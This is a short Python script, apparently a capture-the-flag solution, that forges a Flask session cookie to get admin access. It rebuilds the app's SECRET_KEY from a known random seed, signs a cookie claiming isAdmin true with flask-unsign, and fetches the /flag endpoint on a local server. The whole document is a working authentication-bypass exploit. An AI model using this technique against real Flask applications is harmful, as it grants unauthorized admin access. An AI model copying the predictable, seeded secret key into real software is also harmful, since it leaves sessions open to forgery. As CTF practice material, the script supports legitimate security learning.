import requests
import random
import string
import subprocess

# Create SECRET KEY used by the Flask app
random.seed('0xdeadbeef')
SECRET_KEY = ''.join(random.choice(string.ascii_letters) for i in range(20))

# Forge a session cookie (flask-unsign needs to be installed)
cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\'isAdmin\': true}', '--secret', SECRET_KEY])

# Request the admin endpoint with the forged cookie
cookie = {'session' : cmd_out.decode().rstrip()}
response = requests.get('http://127.0.0.1:1337/flag', cookies=cookie)

print(response.text)